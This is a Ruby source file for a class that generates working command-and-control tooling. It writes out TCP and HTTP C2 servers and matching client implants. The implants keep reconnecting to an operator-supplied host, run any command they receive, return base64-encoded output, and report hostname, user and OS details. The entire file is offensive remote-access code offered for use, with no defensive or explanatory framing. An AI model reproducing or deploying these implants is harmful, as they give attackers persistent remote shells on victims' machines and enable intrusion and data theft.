require 'socket'
require 'json'
require_relative '../utils/colorize'

class C2Framework
  def self.generate_c2_server(port = 4444)
    server = <<~RUBY
      require 'socket'
      require 'json'
      require 'base64'
      
      port = #{port}
      server = TCPServer.new(port)
      clients = []
      
      puts "C2 Server listening on port #{port}"
      
      loop do
        Thread.start(server.accept) do |client|
          clients << client
          puts "New client connected: #{client.peeraddr[2]}:#{client.peeraddr[1]}"
          
          loop do
            begin
              command = client.gets.chomp
              
              if command == 'exit'
                client.close
                clients.delete(client)
                break
              elsif command.start_with?('exec:')
                cmd = command.split('exec:')[1]
                result = `#{cmd} 2>&1`
                client.puts Base64.strict_encode64(result)
              elsif command == 'info'
                info = {
                  hostname: `hostname`.chomp,
                  user: `whoami`.chomp,
                  os: `uname -a`.chomp,
                  pwd: `pwd`.chomp
                }
                client.puts JSON.generate(info)
              else
                client.puts "Unknown command"
              end
            rescue => e
              client.close
              clients.delete(client)
              break
            end
          end
        end
      end
    RUBY
    
    filename = "c2_server_#{Time.now.to_i}.rb"
    File.write(filename, server)
    puts Colorize.green("C2 server saved: #{filename}")
    filename
  end

  def self.generate_c2_client(server_ip, server_port = 4444)
    client = <<~RUBY
      require 'socket'
      require 'json'
      require 'base64'
      
      server_ip = '#{server_ip}'
      server_port = #{server_port}
      
      loop do
        begin
          socket = TCPSocket.new(server_ip, server_port)
          
          loop do
            command = socket.gets.chomp
            
            if command == 'exit'
              socket.close
              exit
            elsif command.start_with?('exec:')
              cmd = command.split('exec:')[1]
              result = `#{cmd} 2>&1`
              socket.puts Base64.strict_encode64(result)
            elsif command == 'info'
              info = {
                hostname: `hostname`.chomp,
                user: `whoami`.chomp,
                os: `uname -a`.chomp,
                pwd: `pwd`.chomp
              }
              socket.puts JSON.generate(info)
            else
              socket.puts "Unknown command"
            end
          end
        rescue => e
          sleep(5)
          retry
        end
      end
    RUBY
    
    filename = "c2_client_#{Time.now.to_i}.rb"
    File.write(filename, client)
    puts Colorize.green("C2 client saved: #{filename}")
    filename
  end

  def self.generate_http_c2_server(port = 8080)
    server = <<~RUBY
      require 'webrick'
      require 'json'
      require 'base64'
      
      port = #{port}
      agents = {}
      
      server = WEBrick::HTTPServer.new(:Port => port)
      
      server.mount_proc '/' do |req, res|
        if req.request_method == 'POST'
          data = JSON.parse(req.body) rescue {}
          agent_id = data['agent_id'] || req.remote_ip
          
          if data['result']
            decoded = Base64.strict_decode64(data['result'])
            puts "[#{agent_id}] Result: #{decoded}"
            agents[agent_id] = { last_seen: Time.now, result: decoded }
          end
          
          if data['info']
            puts "[#{agent_id}] Info: #{data['info']}"
            agents[agent_id] = { last_seen: Time.now, info: data['info'] }
          end
          
          command = agents[agent_id]&.dig(:command)
          res.body = JSON.generate({ command: command || 'sleep' })
          agents[agent_id][:command] = nil if command
        else
          res.body = "C2 Server Active\\nAgents: #{agents.keys.join(', ')}"
        end
      end
      
      server.mount_proc '/command' do |req, res|
        agent_id = req.query['agent_id']
        command = req.query['command']
        
        if agent_id && command
          agents[agent_id] ||= {}
          agents[agent_id][:command] = command
          res.body = "Command queued"
        else
          res.body = "Usage: /command?agent_id=ID&command=COMMAND"
        end
      end
      
      trap('INT') { server.shutdown }
      server.start
    RUBY
    
    filename = "http_c2_server_#{Time.now.to_i}.rb"
    File.write(filename, server)
    puts Colorize.green("HTTP C2 server saved: #{filename}")
    filename
  end

  def self.generate_http_c2_client(server_url)
    client = <<~RUBY
      require 'net/http'
      require 'uri'
      require 'json'
      require 'base64'
      require 'securerandom'
      
      server_url = '#{server_url}'
      agent_id = SecureRandom.hex(8)
      
      loop do
        begin
          uri = URI(server_url)
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = uri.scheme == 'https'
          
          req = Net::HTTP::Post.new(uri.path)
          req['Content-Type'] = 'application/json'
          req.body = JSON.generate({
            agent_id: agent_id,
            info: {
              hostname: `hostname`.chomp,
              user: `whoami`.chomp,
              os: `uname -a`.chomp
            }
          })
          
          res = http.request(req)
          command_data = JSON.parse(res.body) rescue {}
          command = command_data['command']
          
          if command && command != 'sleep'
            result = `#{command} 2>&1`
            encoded = Base64.strict_encode64(result)
            
            req2 = Net::HTTP::Post.new(uri.path)
            req2['Content-Type'] = 'application/json'
            req2.body = JSON.generate({
              agent_id: agent_id,
              result: encoded
            })
            
            http.request(req2)
          end
          
          sleep(5)
        rescue => e
          sleep(10)
          retry
        end
      end
    RUBY
    
    filename = "http_c2_client_#{Time.now.to_i}.rb"
    File.write(filename, client)
    puts Colorize.green("HTTP C2 client saved: #{filename}")
    filename
  end
end

